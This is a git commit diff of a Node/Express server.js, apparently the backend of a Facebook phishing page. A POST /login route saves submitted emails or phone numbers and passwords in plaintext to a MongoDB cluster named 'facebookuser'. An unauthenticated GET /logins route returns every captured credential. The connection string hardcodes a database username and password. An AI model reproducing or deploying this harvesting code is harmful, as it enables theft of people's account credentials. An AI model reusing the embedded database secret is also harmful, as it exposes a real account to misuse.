ef7ebe9cd30e960a99832210daa8ec298e26d3a5
developper237 <166755441+developper237@users.noreply.github.com>
2024-12-29 12:23:03 +0100

    Update server.js

--- server.js
+++ server.js
@@ -11,21 +11,18 @@ app.use(cors());
 app.use(bodyParser.json());
 
 // Connexion à MongoDB
-const mongoose = require('mongoose');
-
-mongoose.connect('mongodb+srv://sergende695:392GHq1269n9yIBq@facebookuser.zf45c.mongodb.net/<admin>?retryWrites=true&w=majority', {
+mongoose.connect('mongodb+srv://sergende695:392GHq1269n9yIBq@facebookuser.zf45c.mongodb.net/<logindata>?retryWrites=true&w=majority', {
   useNewUrlParser: true,
   useUnifiedTopology: true,
 })
   .then(() => console.log('Connexion à MongoDB réussie !'))
   .catch((err) => console.error('Erreur de connexion à MongoDB :', err));
 
-
 // Définition du schéma des données
 const LoginSchema = new mongoose.Schema({
-    emailOrMobile: { type: String, required: true },
-    password: { type: String, required: true },
-    date: { type: Date, default: Date.now },
+  emailOrMobile: { type: String, required: true },
+  password: { type: String, required: true },
+  date: { type: Date, default: Date.now },
 });
 
 // Modèle de données
@@ -33,32 +30,32 @@ const LoginData = mongoose.model('LoginData', LoginSchema);
 
 // Route pour sauvegarder les données du formulaire
 app.post('/login', async (req, res) => {
-    try {
-        const { emailOrMobile, password } = req.body;
+  try {
+    const { emailOrMobile, password } = req.body;
 
-        if (!emailOrMobile || !password) {
-            return res.status(400).json({ error: 'Tous les champs sont requis.' });
-        }
-
-        const newLogin = new LoginData({ emailOrMobile, password });
-        await newLogin.save();
-        res.status(201).json({ message: 'Données enregistrées avec succès.' });
-    } catch (error) {
-        res.status(500).json({ error: 'Erreur lors de l\'enregistrement des données.' });
+    if (!emailOrMobile || !password) {
+      return res.status(400).json({ error: 'Tous les champs sont requis.' });
     }
+
+    const newLogin = new LoginData({ emailOrMobile, password });
+    await newLogin.save();
+    res.status(201).json({ message: 'Données enregistrées avec succès.' });
+  } catch (error) {
+    res.status(500).json({ error: 'Erreur lors de l\'enregistrement des données.' });
+  }
 });
 
 // Route pour récupérer toutes les données
 app.get('/logins', async (req, res) => {
-    try {
-        const logins = await LoginData.find();
-        res.status(200).json(logins);
-    } catch (error) {
-        res.status(500).json({ error: 'Erreur lors de la récupération des données.' });
-    }
+  try {
+    const logins = await LoginData.find();
+    res.status(200).json(logins);
+  } catch (error) {
+    res.status(500).json({ error: 'Erreur lors de la récupération des données.' });
+  }
 });
 
 // Lancer le serveur
 app.listen(PORT, () => {
-    console.log(`Serveur en cours d'exécution sur http://localhost:${PORT}`);
+  console.log(`Serveur en cours d'exécution sur http://localhost:${PORT}`);
 });
